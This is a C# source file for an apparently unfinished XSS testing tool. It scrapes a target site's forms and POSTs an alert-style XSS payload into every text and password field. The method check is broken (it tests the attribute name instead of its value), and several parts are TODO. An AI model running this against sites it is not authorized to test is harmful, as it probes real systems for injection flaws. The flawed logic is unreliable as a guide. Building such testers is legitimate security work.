using HtmlAgilityPack;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace XSS_Test
{
    public class AttackProcess
    {
         #region Members

        private XSSEvalForm _response;
        private FormContainer _frmContainer;
        private readonly List<FormContainer> _formTags = new List<FormContainer>();

        bool _formTagOpen = false;
	    #endregion

        #region Constructor

        public AttackProcess(XSSEvalForm frm)
        {
            _response = frm;
        }

        #endregion

        // Führe einen initialen Request gegen die zu attackierende Seite aus
        public async void InitialRequest(string website)
        {      
            // Listencontainer aller Nodes
            List<HtmlNode> docNodeList;

            HttpClient http = new HttpClient();

            try
            {
                var response = await http.GetByteArrayAsync(website);
                String source = Encoding.GetEncoding("utf-8").GetString(response, 0, response.Length - 1);
                source = WebUtility.HtmlDecode(source);
                HtmlAgilityPack.HtmlDocument result = new HtmlAgilityPack.HtmlDocument();
                result.LoadHtml(source);
                docNodeList = result.DocumentNode.Descendants().ToList();
            }
            catch (Exception e)
            {
                return;
            }

            // Erstelle FormContainer
            FilterFormContainer(docNodeList);

            // 
            GenerateFormActionRequest(website);
        }
        
        private void FilterFormContainer(List<HtmlNode> docNodeList)
        {
            // Valide InputTags zur weiteren Verarbeitung
            IEnumerable<string> validInputTags = new List<string>(){ "text", "password", "submit"};

            // Valide FormTags zur weiteren Verarbeitung
            IEnumerable<string> validFormTags = new List<string>() { "action", "method" };

            // Prüfe alle HTML Nodes (tags)
            foreach (var node in docNodeList)
            {
                // Formtags mit validen Attributen als FormContainer anlegen
                if (node.Name.ToLower() == "form")
                {
                    _formTagOpen = true;

                    if (_frmContainer == null)
                    {
                        _frmContainer = new FormContainer();
                    }
                    else
                    {
                        _formTags.Add(_frmContainer);
                        _frmContainer = new FormContainer();
                    }

                    // Speichere die validen Attribute des FormTags im FormContainer-Object
                    foreach (var attribute in node.Attributes)
                    {
                        if(validFormTags.Contains(attribute.Name.ToLower()))
                        _frmContainer.AddAttribute(attribute.Name, attribute.Value);
                    }
                }

               
                // Input Nodes in FormContainer speichern
                if (node.Name.ToLower() == "input" && _formTagOpen)
                {
                    // InputTag in Liste der validen Tags?
                    if (validInputTags.Contains((node.GetAttributeValue("type", "undefined").ToLower())))
	                {
		                 _frmContainer.AddField(node.GetAttributeValue("name", "undefined"));
	                }
                }
            }

            // Letztes FormTag als Object in den Container hinzufügen
            if (_frmContainer != null)
                _formTags.Add(_frmContainer);            
        }


        private void GenerateFormActionRequest(string website)
        {
            // Für jedes Formtag eine Anfrage an die in "action" definierte Site generieren 
            foreach (var item in _formTags)
            {
                string tmpWebsite = website.Substring(0, website.Length - (website.Length - website.LastIndexOf('/')) + 1);

                string siteEqual = tmpWebsite;

                foreach (var attribute in item.Attributes)
                {
                    if (attribute.Key.Contains("action"))
                    {
                        tmpWebsite += attribute.Value;

                        // Falls self-calling Form: Request gegen original website
                        if (attribute.Value == String.Empty)
                            tmpWebsite = website;
                    }

                }

                // Action - Attribut vorhanden?
                if (siteEqual == tmpWebsite)
                {
                    continue;
                }

                // TODO: PostHttpClient oder GetHttpClient für jedes action generieren
                POSTAttack(tmpWebsite, item);
            }
        }


        public async void Attack(string website)
        {
            List<HtmlNode> _docNodeList;

            HttpClient http = new HttpClient();
            try
            {
                var response = await http.GetByteArrayAsync(website);
                String source = Encoding.GetEncoding("utf-8").GetString(response, 0, response.Length - 1);
                source = WebUtility.HtmlDecode(source);
                HtmlAgilityPack.HtmlDocument result = new HtmlAgilityPack.HtmlDocument();
                result.LoadHtml(source);

                // NodeList erstellen
                _docNodeList = result.DocumentNode.Descendants().ToList();
            }
            catch (Exception e)
            {
                _response.WriteResponse(e.Message);
                return;
            }

            // Alle FormTags ermitteln und in Liste speichern
            if (_docNodeList != null)
            {
                GenerateFormContainer(_docNodeList);
            }
            else
            {
                _response.WriteResponse("Error: Kein FormTag gefunden!");
                return;
            }


            // Führe die Attacken aus
            PerformAttack(website);           
        }

        private void GenerateFormContainer(List<HtmlNode> docNodeList)
        {
            // Alle Formtags mit ihren jeweiligen Attributen und Input-Tags filtern
            foreach (HtmlNode node in docNodeList)
            {
                if (node.Name.ToLower() == "form")
                {
                    _formTagOpen = true;

                    if (_frmContainer == null)
                    {
                        _frmContainer = new FormContainer();
                    }
                    else
                    {
                        // Speichere aktuellen FormContainer in Liste
                        _formTags.Add(_frmContainer.Copy());
                        
                        // Lege für weiteres FormTag ein neues Objekt an
                        _frmContainer = new FormContainer();
                    }

                    // Speichere die Attribute des FormTags im FormContainer-Object
                    foreach (var attribute in node.Attributes)
                    {
                        _frmContainer.AddAttribute(attribute.Name, attribute.Value);
                    }
                }

                // TODO: Felder zur weiteren Verwendung bestimmen

                // Input Nodes in FormContainer speichern
                if (node.Name.ToLower() == "input" && _formTagOpen)
                {
                    if ((node.GetAttributeValue("type", "undefined").ToLower() == "text") || (node.GetAttributeValue("type", "undefined").ToLower() == "password"))
                        _frmContainer.AddField(node.GetAttributeValue("name", "undefined"));

                    // Submit in FormContainer speichern
                    if (node.GetAttributeValue("type", "undefined").ToLower() == "submit")
                        _frmContainer.AddField(node.GetAttributeValue("name", "undefined"));
                }
            }

            // Letztes FormTag als Object in den Container hinzufügen
            if (_frmContainer != null)
                _formTags.Add(_frmContainer);
        }

        private void PerformAttack(string website)
        {
            // Für jedes Formtag eine Anfrage an die in "action" definierte Site generieren 
            foreach (FormContainer item in _formTags)
            {
                string tmpWebsite = website.Substring(0, website.Length - (website.Length - website.LastIndexOf('/')) + 1);

                string siteEqual = tmpWebsite;
                bool postMethod = false;

                foreach (var attribute in item.Attributes)
                {
                    if (attribute.Key.ToLower().Contains("action"))
                    {
                        tmpWebsite += attribute.Value;

                        // Falls self-calling Form: Request gegen original website
                        if (attribute.Value == String.Empty)
                            tmpWebsite = website;
                    }

                    // Method?
                    if (attribute.Key.ToLower().Contains("post"))
                    {
                        postMethod = true;
                    }
                }

                // TODO: Check for Javascript
                // Action - Attribut vorhanden?
                if (siteEqual == tmpWebsite)
                    continue;

                // Request-Site anzeigen
                _response.WriteResponse("Attack against: " + tmpWebsite + Environment.NewLine, true);

                // TODO: PostHttpClient oder GetHttpClient für jedes action generieren
                if (postMethod)
                    POSTAttack(tmpWebsite, item);
                else
                    continue; // TODO: GETAttack()
            }
        }

        public async void POSTAttack(string website, FormContainer item)
        {
            string[] inputs = item.Fields.ToArray<string>();

            using (var client = new HttpClient())
            {
                var values = new Dictionary<string, string>();

                try
                {
                    if (inputs != null)
                    {
                        foreach (string input in inputs)
                        {
                            if (input.ToLower() != "submit")
                                values.Add(input, "<IMG SRC= onmouseover=\"alert('xxs')\">");
                        }
                    }
                }
                catch (Exception e)
                {

                }

                string[] submit = item.GetSubmit();
                if (submit != null)
                    values.Add(submit[0], submit[1]);

                var content = new FormUrlEncodedContent(values);

                var response = await client.PostAsync(website, content);


                _response.WriteResponse(response.ToString() + Environment.NewLine + response.RequestMessage + Environment.NewLine + await response.Content.ReadAsStringAsync(), true);
            }
        }

    }
}
